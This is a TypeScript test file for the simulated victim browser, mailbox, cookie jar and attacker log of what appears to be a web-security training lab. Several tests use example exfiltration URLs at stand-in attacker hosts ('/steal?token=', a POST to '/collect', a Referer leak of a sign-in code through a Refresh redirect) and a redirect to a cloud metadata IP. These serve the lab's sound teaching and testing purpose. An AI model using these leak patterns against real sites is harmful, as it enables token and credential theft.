// The simulated victim's stores and browser (src/core/sim.ts): inbox, attacker log, cookie jar, SimBrowser.
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { describe, it, expect, vi } from 'vitest';
import { NewSessionLimitError, insidePerSessionFactory, perSession } from '../src/core/lab.js';
import type { Level } from '../src/core/levels.js';
import {
  ADMIN_MAILBOX, PLAYER_MAILBOX, SIM_LIMITS, SIM_USER_AGENT, attackerLog, simInbox, simWorld,
  type SimHandler, type SimRequest, type SimResponse, type SimWorld,
} from '../src/core/sim.js';

let n = 0;
/** Build sim state the way labs must: inside a perSession factory (one fresh session per call). */
function inSession<T>(make: () => T, level: Level = 'acolyte'): T {
  return perSession(() => make()).for({ sessionId: `sim-${++n}`, level });
}
/** A world whose clock tests can move (world.now = ...). */
const world = (mailboxes: readonly string[] = [ADMIN_MAILBOX]): SimWorld => inSession(() => simWorld({ mailboxes }));

/** A handler from a route table: path -> response (or a function of the request). Records every request. */
function site(routes: Record<string, SimResponse | ((r: SimRequest) => SimResponse)>) {
  const seen: SimRequest[] = [];
  const handler: SimHandler = (r) => {
    seen.push(r);
    const route = routes[r.path];
    if (route === undefined) return { status: 404, body: 'Not found' };
    return typeof route === 'function' ? route(r) : route;
  };
  return { handler, seen };
}
const redirect = (location: string, status = 302, extra: Record<string, string | string[]> = {}): SimResponse =>
  ({ status, headers: { location, ...extra } });

describe('sim state lives in perSession (per player and level)', () => {
  it('every sim store refuses to be created outside a perSession factory', () => {
    expect(() => simWorld()).toThrow(/perSession/);
    expect(() => simInbox()).toThrow(/perSession/);
    expect(() => attackerLog()).toThrow(/perSession/);
    const w = world();
    expect(() => w.browser(() => ({ status: 200 }))).toThrow(/perSession/);
  });

  it('insidePerSessionFactory() is true only while a factory runs, even when the factory throws', () => {
    expect(insidePerSessionFactory()).toBe(false);
    let during = false;
    perSession(() => { during = insidePerSessionFactory(); return {}; }).for({ sessionId: 's', level: 'acolyte' });
    expect(during).toBe(true);
    expect(insidePerSessionFactory()).toBe(false);
    expect(() => perSession(() => { throw new Error('boom'); }).for({ sessionId: 's', level: 'acolyte' })).toThrow('boom');
    expect(insidePerSessionFactory()).toBe(false);
  });

  it('isolates sessions and levels; reset gives a fresh world', () => {
    const labs = perSession(() => simWorld({ mailboxes: [ADMIN_MAILBOX] }));
    const a = { sessionId: 'A', level: 'acolyte' as Level };
    labs.for(a).inbox.deliver({ from: 'x@citadel.test', to: PLAYER_MAILBOX, subject: 'only A', body: '' });
    labs.for(a).attackerLog.record({ method: 'GET', url: 'http://attacker.test/a' });
    expect(labs.for({ sessionId: 'B', level: 'acolyte' }).inbox.list(PLAYER_MAILBOX)).toEqual([]);
    expect(labs.for({ sessionId: 'A', level: 'templar' }).inbox.list(PLAYER_MAILBOX)).toEqual([]);
    expect(labs.for({ sessionId: 'A', level: 'templar' }).attackerLog.entries()).toEqual([]);
    expect(labs.for(a).inbox.list(PLAYER_MAILBOX)).toHaveLength(1);
    labs.reset(a);
    expect(labs.for(a).inbox.list(PLAYER_MAILBOX)).toEqual([]);
    expect(labs.for(a).attackerLog.entries()).toEqual([]);
  });

  it('inherits the holder\'s new-instance limit', () => {
    const labs = perSession(() => simWorld(), { maxNewPerMinute: 2, now: () => 0 });
    labs.for({ sessionId: '1', level: 'acolyte' });
    labs.for({ sessionId: '2', level: 'acolyte' });
    expect(() => labs.for({ sessionId: '3', level: 'acolyte' })).toThrow(NewSessionLimitError);
  });
});

describe('simInbox: mailboxes keyed by address', () => {
  it('always has the player\'s mailbox (pilgrim@citadel.test), plus the ones the lab names', () => {
    expect(PLAYER_MAILBOX).toBe('pilgrim@citadel.test');
    expect(inSession(() => simInbox()).addresses).toEqual([PLAYER_MAILBOX]);
    const inbox = inSession(() => simInbox({ mailboxes: [' Citadel_Admin@CITADEL.test ', PLAYER_MAILBOX] }));
    expect(inbox.addresses).toEqual([PLAYER_MAILBOX, ADMIN_MAILBOX]);
  });

  it('delivers with an id and the clock\'s time; lists newest first; addresses match case-insensitively', () => {
    let t = 1_000;
    const inbox = inSession(() => simInbox({ mailboxes: [ADMIN_MAILBOX], now: () => t }));
    const first = inbox.deliver({ from: 'noreply@citadel.test', to: 'CITADEL_ADMIN@citadel.test', subject: 'one', body: 'b1', links: ['http://citadel.test/1'] });
    t = 2_000;
    const second = inbox.deliver({ from: 'noreply@citadel.test', to: ADMIN_MAILBOX, subject: 'two', body: 'b2' });
    expect(first).toMatchObject({ id: 1, at: 1_000, to: ADMIN_MAILBOX, subject: 'one', links: ['http://citadel.test/1'] });
    expect(second).toMatchObject({ id: 2, at: 2_000, links: [] });
    expect(inbox.list(ADMIN_MAILBOX).map((m) => m.subject)).toEqual(['two', 'one']);
    expect(inbox.newest(' citadel_admin@citadel.test')?.subject).toBe('two');
    expect(inbox.list(PLAYER_MAILBOX)).toEqual([]);
    expect(inbox.newest(PLAYER_MAILBOX)).toBeUndefined();
    expect(Object.isFrozen(first)).toBe(true);
    expect(Object.isFrozen(first?.links)).toBe(true);
  });

  it('mail to an unknown address bounces (undefined) and stores nothing', () => {
    const inbox = inSession(() => simInbox());
    expect(inbox.deliver({ from: 'a@b', to: 'nobody@citadel.test', subject: 's', body: 'b' })).toBeUndefined();
    expect(inbox.has('nobody@citadel.test')).toBe(false);
    expect(inbox.list('nobody@citadel.test')).toEqual([]);
    expect(inbox.list('__proto__')).toEqual([]);
  });

  it(`keeps at most ${SIM_LIMITS.mailsPerMailbox} mails per mailbox (oldest dropped), independently per mailbox`, () => {
    const inbox = inSession(() => simInbox({ mailboxes: [ADMIN_MAILBOX] }));
    inbox.deliver({ from: 'x', to: ADMIN_MAILBOX, subject: 'admin keeps this', body: '' });
    for (let i = 0; i < SIM_LIMITS.mailsPerMailbox + 5; i++) inbox.deliver({ from: 'x', to: PLAYER_MAILBOX, subject: `m${i}`, body: '' });
    const mine = inbox.list(PLAYER_MAILBOX);
    expect(mine).toHaveLength(SIM_LIMITS.mailsPerMailbox);
    expect(mine[0].subject).toBe(`m${SIM_LIMITS.mailsPerMailbox + 4}`);
    expect(mine.at(-1)?.subject).toBe('m5');
    expect(inbox.list(ADMIN_MAILBOX).map((m) => m.subject)).toEqual(['admin keeps this']);
  });

  it('clips long fields and keeps at most a few links (non-strings dropped; an over-long link stays too long to follow)', () => {
    const inbox = inSession(() => simInbox());
    const m = inbox.deliver({
      from: 'f'.repeat(1000), to: PLAYER_MAILBOX, subject: 's'.repeat(1000), body: 'b'.repeat(100_000),
      links: ['http://citadel.test/1', 42 as never, 'http://citadel.test/2', `http://attacker.test/${'x'.repeat(10_000)}`, 'http://citadel.test/4'],
    });
    expect(m?.from.length).toBe(SIM_LIMITS.addressLength);
    expect(m?.subject.length).toBe(SIM_LIMITS.subjectLength);
    expect(m?.body.length).toBe(SIM_LIMITS.bodyLength);
    expect(m?.links).toHaveLength(SIM_LIMITS.linksPerMail);
    expect(m?.links.slice(0, 2)).toEqual(['http://citadel.test/1', 'http://citadel.test/2']);
    expect(m?.links[2].length).toBe(SIM_LIMITS.urlLength + 1);
  });

  it('non-string fields are empty strings, never a throw', () => {
    const inbox = inSession(() => simInbox());
    const m = inbox.deliver({ from: {} as never, to: PLAYER_MAILBOX, subject: undefined as never, body: 5 as never, links: 'x' as never });
    expect(m).toMatchObject({ from: '', subject: '', body: '', links: [] });
  });

  it(`refuses bad mailbox lists: more than ${SIM_LIMITS.mailboxes}, or an address that is not one`, () => {
    const many = Array.from({ length: SIM_LIMITS.mailboxes }, (_, i) => `u${i}@citadel.test`);
    expect(() => inSession(() => simInbox({ mailboxes: many }))).toThrow(/mailboxes/);
    expect(() => inSession(() => simInbox({ mailboxes: ['no-at-sign'] }))).toThrow(/address/);
    expect(() => inSession(() => simInbox({ mailboxes: [`${'a'.repeat(300)}@citadel.test`] }))).toThrow(/address/);
  });
});

describe('attackerLog: append-only, capped', () => {
  it('records method, URL, Referer and body with a sequence number and the clock\'s time', () => {
    let t = 5;
    const log = inSession(() => attackerLog({ now: () => t }));
    const a = log.record({ method: 'GET', url: 'http://attacker.test/a', referer: 'http://citadel.test/x' });
    t = 6;
    const b = log.record({ method: 'POST', url: 'http://attacker.test/b', body: 'code=1' });
    expect(a).toEqual({ seq: 1, at: 5, method: 'GET', url: 'http://attacker.test/a', referer: 'http://citadel.test/x' });
    expect(b).toEqual({ seq: 2, at: 6, method: 'POST', url: 'http://attacker.test/b', body: 'code=1' });
    expect(log.entries()).toEqual([a, b]);
    expect(log.total).toBe(2);
  });

  it('is append-only: frozen entries, a frozen list, and no way to edit or remove', () => {
    const log = inSession(() => attackerLog());
    log.record({ method: 'GET', url: 'http://attacker.test/' });
    const list = log.entries();
    expect(Object.isFrozen(list)).toBe(true);
    expect(Object.isFrozen(list[0])).toBe(true);
    expect(() => { (list as unknown as unknown[]).push({}); }).toThrow();
    expect(Object.keys(log).sort()).toEqual(['entries', 'record', 'total']);
  });

  it(`keeps the newest ${SIM_LIMITS.logEntries} entries; sequence numbers keep counting`, () => {
    const log = inSession(() => attackerLog());
    for (let i = 1; i <= SIM_LIMITS.logEntries + 7; i++) log.record({ method: 'GET', url: `http://attacker.test/${i}` });
    const list = log.entries();
    expect(list).toHaveLength(SIM_LIMITS.logEntries);
    expect(list[0].seq).toBe(8);
    expect(list.at(-1)?.seq).toBe(SIM_LIMITS.logEntries + 7);
    expect(log.total).toBe(SIM_LIMITS.logEntries + 7);
  });

  it('clips URL, Referer and body to the URL length cap', () => {
    const log = inSession(() => attackerLog());
    const big = 'x'.repeat(10_000);
    const e = log.record({ method: 'GET'.repeat(10), url: big, referer: big, body: big });
    expect(e.url.length).toBe(SIM_LIMITS.urlLength);
    expect(e.referer?.length).toBe(SIM_LIMITS.urlLength);
    expect(e.body?.length).toBe(SIM_LIMITS.urlLength);
    expect(e.method.length).toBeLessThanOrEqual(10);
  });
});

describe('SimBrowser: requests to the citadel go to the lab\'s in-process handler', () => {
  it('a GET page: the handler sees method, URL, path, query, headers and cookies; the visit ends on that page', () => {
    const w = world();
    const s = site({ '/home': { status: 200, body: 'Welcome home' } });
    const b = inSession(() => w.browser(s.handler));
    const v = b.follow('http://citadel.test/home?x=1&x=2&y=%20');
    expect(v.outcome).toBe('page');
    expect(v.page).toEqual({ url: 'http://citadel.test/home?x=1&x=2&y=%20', status: 200, body: 'Welcome home' });
    expect(v.hops).toEqual([{ site: 'citadel', method: 'GET', url: 'http://citadel.test/home?x=1&x=2&y=%20', via: 'start', status: 200 }]);
    const r = s.seen[0];
    expect(r).toMatchObject({ method: 'GET', url: 'http://citadel.test/home?x=1&x=2&y=%20', path: '/home' });
    expect(r.query.getAll('x')).toEqual(['1', '2']);
    expect(r.query.get('y')).toBe(' ');
    expect(r.headers).toEqual({ host: 'citadel.test', 'user-agent': SIM_USER_AGENT });
    expect({ ...r.cookies }).toEqual({});
    expect({ ...r.body }).toEqual({});
    expect(w.attackerLog.entries()).toEqual([]);
  });

  it('never calls the handler for attacker.test or other hosts', () => {
    const w = world();
    const s = site({});
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://attacker.test/x');
    b.follow('http://127.0.0.1/');
    b.follow('javascript:alert(1)');
    expect(s.seen).toEqual([]);
  });

  it('a handler must answer synchronously with a valid status', () => {
    const w = world();
    const bad = [
      () => Promise.resolve({ status: 200 }) as never,
      () => ({ status: 99 }), () => ({ status: 600 }), () => ({ status: 200.5 }), () => ({ status: Number.NaN }),
      () => null as never, () => ({ status: 200, body: 5 as never }),
    ];
    for (const h of bad) {
      const b = inSession(() => w.browser(h));
      expect(() => b.follow('http://citadel.test/'), String(h)).toThrow(/SimHandler/);
    }
  });
});

describe('SimBrowser: attacker.test requests land in the player\'s attacker log', () => {
  it('a link straight to attacker.test: logged (no Referer from a mail client), the visit ends there', () => {
    const w = world();
    w.now = () => 42;
    const b = inSession(() => w.browser(site({}).handler));
    const v = b.follow('http://user:pw@evil.attacker.test:8080/steal?token=abc#frag');
    expect(v.outcome).toBe('attacker');
    expect(v.hops).toEqual([{ site: 'attacker', method: 'GET', url: 'http://evil.attacker.test:8080/steal?token=abc', via: 'start' }]);
    expect(w.attackerLog.entries()).toEqual([{ seq: 1, at: 42, method: 'GET', url: 'http://evil.attacker.test:8080/steal?token=abc' }]);
  });

  it('other hosts are unreachable: nothing logged, the reason is in the trace', () => {
    const w = world();
    const b = inSession(() => w.browser(site({}).handler));
    for (const [u, reason] of [['javascript:alert(1)', 'scheme'], ['http://[::1]/', 'ip'], ['http://localhost/', 'host'], ['http://citadel.test:8080/', 'port'], ['nope', 'invalid'], [`http://attacker.test/${'a'.repeat(3000)}`, 'too-long']] as const) {
      const v = b.follow(u);
      expect(v.outcome, u).toBe('unreachable');
      expect(v.hops, u).toHaveLength(1);
      expect(v.hops[0], u).toMatchObject({ site: 'other', reason, via: 'start' });
      expect(v.hops[0].url.length, u).toBeLessThanOrEqual(SIM_LIMITS.urlLength);
    }
    expect(w.attackerLog.entries()).toEqual([]);
  });
});

describe('SimBrowser: redirects and Referer', () => {
  it('follows a 3xx chain; a redirect keeps the referrer of the page that started the navigation (none from mail)', () => {
    const w = world();
    const s = site({ '/a': redirect('/b'), '/b': redirect('http://attacker.test/x?code=1', 301) });
    const b = inSession(() => w.browser(s.handler));
    const v = b.follow('http://citadel.test/a?secret=1');
    expect(v.outcome).toBe('attacker');
    expect(v.hops.map((h) => [h.site, h.via, h.status])).toEqual([['citadel', 'start', 302], ['citadel', 'redirect', 301], ['attacker', 'redirect', undefined]]);
    expect(s.seen.map((r) => r.headers.referer)).toEqual([undefined, undefined]);
    expect(w.attackerLog.entries()[0]).not.toHaveProperty('referer'); // the redirecting URL is not a page: it is not the Referer
  });

  it('a link clicked on a citadel page sends that page as Referer, and keeps it across redirects', () => {
    const w = world();
    const s = site({ '/go': redirect('http://attacker.test/x') });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/go?to=x', { referrer: 'http://citadel.test/messages?id=7#top' });
    expect(s.seen[0].headers.referer).toBe('http://citadel.test/messages?id=7');
    expect(w.attackerLog.entries()[0].referer).toBe('http://citadel.test/messages?id=7');
  });

  it('a citadel PAGE that moves on by itself (Refresh) sends its own URL as Referer: the classic code leak', () => {
    const w = world();
    const s = site({
      '/callback': (r) => ({ status: 200, headers: { Refresh: `0; url=${r.query.get('next') ?? '/'}` }, body: 'Signed in' }),
    });
    const b = inSession(() => w.browser(s.handler));
    const v = b.follow('http://citadel.test/callback?code=SECRET&next=http://attacker.test/landing');
    expect(v.outcome).toBe('attacker');
    expect(v.hops.map((h) => h.via)).toEqual(['start', 'refresh']);
    expect(w.attackerLog.entries()[0]).toMatchObject({
      url: 'http://attacker.test/landing',
      referer: 'http://citadel.test/callback?code=SECRET&next=http://attacker.test/landing',
    });
  });

  it('Refresh syntax: delay then ";" or ",", optional url= (any case), optional quotes, relative URLs; none = no navigation', () => {
    const w = world();
    for (const value of ['0;url=/next', '5; URL=\'/next\'', '0, url="/next"', '0;   /next', '3;Url=/next']) {
      const s = site({ '/p': { status: 200, headers: { refresh: value } }, '/next': { status: 200, body: 'next' } });
      const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/p');
      expect(v.outcome, value).toBe('page');
      expect(v.page?.url, value).toBe('http://citadel.test/next');
      expect(s.seen[1].headers.referer, value).toBe('http://citadel.test/p');
    }
    for (const value of ['0', '5;', 'garbage', '']) {
      const s = site({ '/p': { status: 200, headers: { refresh: value } } });
      const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/p');
      expect(v.hops, value).toHaveLength(1);
      expect(v.outcome, value).toBe('page');
    }
  });

  it('Referrer-Policy on the page decides what the next hop gets; default is the full URL (legacy no-referrer-when-downgrade)', () => {
    const cases: [string | undefined, string | undefined, string | undefined][] = [
      // policy, Referer at attacker.test, Referer at a citadel page
      [undefined, 'http://citadel.test/p?k=1', 'http://citadel.test/p?k=1'],
      ['no-referrer', undefined, undefined],
      ['origin', 'http://citadel.test/', 'http://citadel.test/'],
      ['strict-origin', 'http://citadel.test/', 'http://citadel.test/'],
      ['same-origin', undefined, 'http://citadel.test/p?k=1'],
      ['origin-when-cross-origin', 'http://citadel.test/', 'http://citadel.test/p?k=1'],
      ['strict-origin-when-cross-origin', 'http://citadel.test/', 'http://citadel.test/p?k=1'],
      ['unsafe-url', 'http://citadel.test/p?k=1', 'http://citadel.test/p?k=1'],
      ['no-referrer-when-downgrade', 'http://citadel.test/p?k=1', 'http://citadel.test/p?k=1'],
      ['unsafe-url, bogus', 'http://citadel.test/p?k=1', 'http://citadel.test/p?k=1'], // unknown tokens are ignored
      ['no-referrer, ORIGIN', 'http://citadel.test/', 'http://citadel.test/'],      // the last valid one wins
    ];
    for (const [policy, toAttacker, toCitadel] of cases) {
      const page = (next: string): SimResponse => ({ status: 200, headers: { refresh: `0;url=${next}`, ...(policy ? { 'referrer-policy': policy } : {}) } });
      const w = world();
      inSession(() => w.browser(site({ '/p': page('http://attacker.test/a') }).handler)).follow('http://citadel.test/p?k=1');
      expect(w.attackerLog.entries()[0]?.referer, `${policy} -> attacker`).toBe(toAttacker);
      const s = site({ '/p': page('/q'), '/q': { status: 200 } });
      inSession(() => world().browser(s.handler)).follow('http://citadel.test/p?k=1');
      expect(s.seen[1].headers.referer, `${policy} -> citadel`).toBe(toCitadel);
    }
  });

  it('a Referrer-Policy on a redirect response applies to the next hop', () => {
    const w = world();
    const s = site({ '/go': redirect('http://attacker.test/x', 302, { 'Referrer-Policy': 'no-referrer' }) });
    inSession(() => w.browser(s.handler)).follow('http://citadel.test/go', { referrer: 'http://citadel.test/inbox' });
    expect(w.attackerLog.entries()[0]).not.toHaveProperty('referer');
  });

  it('https -> http is a downgrade: no Referer under the default policy', () => {
    const w = world();
    const s = site({ '/p': { status: 200, headers: { refresh: '0;url=http://attacker.test/a' } } });
    inSession(() => w.browser(s.handler)).follow('https://citadel.test/p?k=1');
    expect(w.attackerLog.entries()[0]).not.toHaveProperty('referer');
  });

  it('the Referer never carries userinfo or a fragment', () => {
    const w = world();
    const s = site({ '/p': { status: 200, headers: { refresh: '0;url=http://attacker.test/a' } } });
    inSession(() => w.browser(s.handler)).follow('http://admin:pw@citadel.test/p?k=1#frag');
    expect(w.attackerLog.entries()[0].referer).toBe('http://citadel.test/p?k=1');
  });

  it('a referrer must be a citadel page (the victim never browses from your server)', () => {
    const w = world();
    const b = inSession(() => w.browser(site({}).handler));
    expect(() => b.follow('http://citadel.test/', { referrer: 'http://attacker.test/page' })).toThrow(/referrer/);
    expect(() => b.follow('http://citadel.test/', { referrer: 'javascript:1' })).toThrow(/referrer/);
  });

  it('nothing comes from attacker.test: the visit ends at the first attacker request', () => {
    const w = world();
    const s = site({ '/a': redirect('http://attacker.test/1') });
    const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/a');
    expect(v.hops.at(-1)?.site).toBe('attacker');
    expect(w.attackerLog.entries()).toHaveLength(1);
    expect(s.seen).toHaveLength(1);
  });

  it(`stops after ${SIM_LIMITS.maxRedirects} redirects (too-many-redirects); exactly ${SIM_LIMITS.maxRedirects} is fine`, () => {
    const w = world();
    const endless = (r: SimRequest): SimResponse => redirect(`/n${Number(r.path.slice(2)) + 1}`);
    const s = { handler: (r: SimRequest) => endless(r) };
    const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/n0');
    expect(v.outcome).toBe('too-many-redirects');
    expect(v.hops).toHaveLength(SIM_LIMITS.maxRedirects + 1);
    const ten = (r: SimRequest): SimResponse => {
      const i = Number(r.path.slice(2));
      return i < SIM_LIMITS.maxRedirects ? redirect(`/n${i + 1}`) : { status: 200, body: 'done' };
    };
    const ok = inSession(() => w.browser(ten)).follow('http://citadel.test/n0');
    expect(ok.outcome).toBe('page');
    expect(ok.hops).toHaveLength(SIM_LIMITS.maxRedirects + 1);
  });

  it('detects a loop (the same request again with nothing changed) before re-requesting it', () => {
    const w = world();
    const s = site({ '/a': redirect('/b'), '/b': redirect('/a') });
    const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/a');
    expect(v.outcome).toBe('loop');
    expect(s.seen.map((r) => r.path)).toEqual(['/a', '/b']);
    const self = site({ '/s': redirect('') }); // an empty Location is the same URL again
    expect(inSession(() => w.browser(self.handler)).follow('http://citadel.test/s').outcome).toBe('loop');
    const refresh = site({ '/r': { status: 200, headers: { refresh: '0;url=/r' } } });
    expect(inSession(() => w.browser(refresh.handler)).follow('http://citadel.test/r').outcome).toBe('loop');
  });

  it('a sign-in bounce that sets a cookie is not a loop', () => {
    const w = world();
    const s = site({
      '/private': (r) => (r.cookies.sid === 'ok' ? { status: 200, body: 'private' } : redirect('/login')),
      '/login': redirect('/private', 302, { 'set-cookie': 'sid=ok; Path=/' }),
    });
    const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/private');
    expect(v.outcome).toBe('page');
    expect(v.page?.body).toBe('private');
    expect(s.seen.map((r) => r.path)).toEqual(['/private', '/login', '/private']);
  });

  it('a Location that leaves the sim is unreachable; relative Locations resolve against the current URL', () => {
    const w = world();
    const s = site({ '/a': redirect('http://169.254.169.254/latest'), '/dir/b': redirect('c'), '/dir/c': { status: 200 }, '/long': redirect(`/${'x'.repeat(5000)}`) });
    const b = inSession(() => w.browser(s.handler));
    expect(b.follow('http://citadel.test/a')).toMatchObject({ outcome: 'unreachable' });
    expect(b.follow('http://citadel.test/a').hops[1]).toMatchObject({ site: 'other', reason: 'ip', via: 'redirect' });
    expect(b.follow('http://citadel.test/dir/b').page?.url).toBe('http://citadel.test/dir/c');
    const long = b.follow('http://citadel.test/long');
    expect(long.outcome).toBe('unreachable');
    expect(long.hops[1]).toMatchObject({ reason: 'too-long' });
    expect(long.hops[1].url.length).toBeLessThanOrEqual(SIM_LIMITS.urlLength);
  });

  it('header names are case-insensitive; a 3xx without Location is a page', () => {
    const w = world();
    const s = site({ '/a': { status: 302, headers: { LOCATION: '/b' } }, '/b': { status: 304 } });
    const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/a');
    expect(v).toMatchObject({ outcome: 'page', page: { url: 'http://citadel.test/b', status: 304, body: '' } });
  });
});

describe('SimBrowser: form posts', () => {
  it('submit() POSTs a form; 303 (and 301/302) continue as GET without the body; 307/308 keep POST and body', () => {
    for (const [status, method] of [[303, 'GET'], [302, 'GET'], [301, 'GET'], [307, 'POST'], [308, 'POST']] as const) {
      const w = world();
      const s = site({ '/login': redirect('/home', status), '/home': { status: 200 } });
      const v = inSession(() => w.browser(s.handler)).submit('http://citadel.test/login', { username: 'citadel_admin', password: 'p w&' });
      expect(v.outcome).toBe('page');
      expect(s.seen[0]).toMatchObject({ method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' } });
      expect({ ...s.seen[0].body }).toEqual({ username: 'citadel_admin', password: 'p w&' });
      expect(s.seen[1].method, String(status)).toBe(method);
      expect({ ...s.seen[1].body }, String(status)).toEqual(method === 'POST' ? { username: 'citadel_admin', password: 'p w&' } : {});
      expect(v.hops.map((h) => h.method)).toEqual(['POST', method]);
    }
  });

  it('a POST forwarded to attacker.test (307) is logged with its body', () => {
    const w = world();
    const s = site({ '/send': redirect('http://attacker.test/collect', 307) });
    inSession(() => w.browser(s.handler)).submit('http://citadel.test/send', { code: 'abc', x: '1 2' });
    expect(w.attackerLog.entries()[0]).toMatchObject({ method: 'POST', url: 'http://attacker.test/collect', body: 'code=abc&x=1+2' });
  });

  it('non-string form values are dropped; body objects have no prototype', () => {
    const w = world();
    const s = site({ '/f': { status: 200 } });
    inSession(() => w.browser(s.handler)).submit('http://citadel.test/f', { a: 'x', b: 5 as never, __proto__: 'p' } as never);
    expect(Object.getPrototypeOf(s.seen[0].body)).toBeNull();
    expect(s.seen[0].body.a).toBe('x');
    expect(Object.hasOwn(s.seen[0].body, 'b')).toBe(false);
  });
});

describe('SimBrowser cookie jar (citadel.test only, never real cookies)', () => {
  it('stores Set-Cookie from citadel responses and sends it back (decoded in req.cookies, raw in the Cookie header)', () => {
    const w = world();
    const s = site({
      '/login': { status: 200, headers: { 'set-cookie': ['sid=a%20b; Path=/; HttpOnly; SameSite=Lax', 'theme=dark'] } },
      '/me': { status: 200 },
    });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/login');
    b.follow('http://citadel.test/me');
    expect(s.seen[1].headers.cookie).toBe('sid=a%20b; theme=dark');
    expect({ ...s.seen[1].cookies }).toEqual({ sid: 'a b', theme: 'dark' });
    expect(Object.getPrototypeOf(s.seen[1].cookies)).toBeNull();
    expect(b.cookies.get('sid')).toBe('a%20b');
    expect(b.cookies.size).toBe(2);
  });

  it('the lab can sign the victim in up front (set), and delete or clear cookies', () => {
    const w = world();
    const s = site({ '/me': { status: 200 } });
    const b = inSession(() => w.browser(s.handler));
    b.cookies.set('idp_session', 'admin-1');
    b.cookies.set('scoped', 'x', { path: '/admin' });
    b.follow('http://citadel.test/me');
    expect(s.seen[0].cookies).toEqual(Object.assign(Object.create(null), { idp_session: 'admin-1' }));
    expect(b.cookies.list().map((c) => [c.name, c.path])).toEqual([['idp_session', '/'], ['scoped', '/admin']]);
    b.cookies.delete('scoped');
    expect(b.cookies.size).toBe(1);
    b.cookies.clear();
    expect(b.cookies.size).toBe(0);
    expect(() => b.cookies.set('bad name', 'x')).toThrow(/cookie/);
  });

  it('is never sent to attacker.test (and the log has no cookie column)', () => {
    const w = world();
    const s = site({ '/go': redirect('http://attacker.test/x', 302, { 'set-cookie': 'sid=secret; Path=/' }) });
    const b = inSession(() => w.browser(s.handler));
    b.cookies.set('idp', 'secret2');
    b.follow('http://citadel.test/go');
    expect(JSON.stringify(w.attackerLog.entries())).not.toMatch(/secret/);
  });

  it('Path: sent only under the cookie path; the default path comes from the request path', () => {
    const w = world();
    const s = site({
      '/admin/login': { status: 200, headers: { 'set-cookie': ['a=1; Path=/admin', 'b=2', 'c=3; Path=relative'] } },
      '/admin': { status: 200 }, '/admin/x': { status: 200 }, '/administrator': { status: 200 }, '/': { status: 200 },
    });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/admin/login');
    for (const p of ['/admin', '/admin/x', '/administrator', '/']) b.follow(`http://citadel.test${p}`);
    expect(s.seen.slice(1).map((r) => r.headers.cookie)).toEqual(['a=1; b=2; c=3', 'a=1; b=2; c=3', undefined, undefined]);
  });

  it('Max-Age / Expires follow the world clock; Max-Age=0 or a past date deletes', () => {
    const w = world();
    w.now = () => Date.UTC(2026, 0, 1);
    const s = site({
      '/set': { status: 200, headers: { 'set-cookie': ['short=1; Max-Age=60', 'long=2; Expires=Wed, 01 Jan 2031 00:00:00 GMT', 'bad=3; Max-Age=soon'] } },
      '/del': { status: 200, headers: { 'set-cookie': ['long=; Max-Age=0', 'bad=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'] } },
      '/me': { status: 200 },
    });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/set');
    expect(b.cookies.list().map((c) => c.name)).toEqual(['short', 'long', 'bad']);
    w.now = () => Date.UTC(2026, 0, 1) + 61_000;
    b.follow('http://citadel.test/me');
    expect(s.seen.at(-1)?.headers.cookie).toBe('long=2; bad=3');
    b.follow('http://citadel.test/del');
    expect(b.cookies.list()).toEqual([]);
  });

  it('Domain must be citadel.test; Secure needs https (as browsers enforce)', () => {
    const w = world();
    const cookies = ['a=1; Domain=attacker.test', 'b=2; Domain=citadel.test', 'c=3; Domain=.CITADEL.TEST', 'd=4; Domain=test', 'e=5; Domain=x.citadel.test', 'f=6; Secure'];
    const s = site({ '/set': { status: 200, headers: { 'set-cookie': cookies } }, '/me': { status: 200 } });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/set');
    expect(b.cookies.list().map((c) => c.name)).toEqual(['b', 'c']);
    b.follow('https://citadel.test/set');
    expect(b.cookies.list().map((c) => c.name)).toEqual(['b', 'c', 'f']);
    b.follow('http://citadel.test/me');
    expect(s.seen.at(-1)?.headers.cookie).toBe('b=2; c=3');
    b.follow('https://citadel.test/me');
    expect(s.seen.at(-1)?.headers.cookie).toBe('b=2; c=3; f=6');
  });

  it('ignores malformed lines and bad names; replaces a cookie with the same name and path', () => {
    const w = world();
    const s = site({ '/set': { status: 200, headers: { 'set-cookie': ['novalue', '=x', 'bad name=1', 'ok=1', 'ok=2', 'semi=a;b'] } } });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/set');
    expect(b.cookies.list().map((c) => `${c.name}=${c.value}`)).toEqual(['ok=2', 'semi=a']);
  });

  it(`caps: at most ${SIM_LIMITS.cookies} cookies (oldest evicted), each at most ${SIM_LIMITS.cookieBytes} bytes`, () => {
    const w = world();
    const lines = Array.from({ length: SIM_LIMITS.cookies + 5 }, (_, i) => `c${i}=${i}`);
    const s = site({ '/set': { status: 200, headers: { 'set-cookie': [...lines, `big=${'x'.repeat(SIM_LIMITS.cookieBytes)}`] } } });
    const b = inSession(() => w.browser(s.handler));
    b.follow('http://citadel.test/set');
    expect(b.cookies.size).toBe(SIM_LIMITS.cookies);
    expect(b.cookies.list()[0].name).toBe('c5');
    expect(b.cookies.get('big')).toBeUndefined();
    expect(() => b.cookies.set('big', 'x'.repeat(SIM_LIMITS.cookieBytes))).toThrow(/cookie/);
  });
});

describe('SimWorld: the victim\'s recent visits', () => {
  it(`records each visit, newest last, at most ${SIM_LIMITS.visits}`, () => {
    const w = world();
    const b = inSession(() => w.browser(site({ '/p': { status: 200 } }).handler));
    for (let i = 0; i < SIM_LIMITS.visits + 3; i++) b.follow(`http://citadel.test/p?i=${i}`);
    expect(w.visits).toHaveLength(SIM_LIMITS.visits);
    expect(w.visits.at(-1)?.hops[0].url).toBe(`http://citadel.test/p?i=${SIM_LIMITS.visits + 2}`);
  });
});

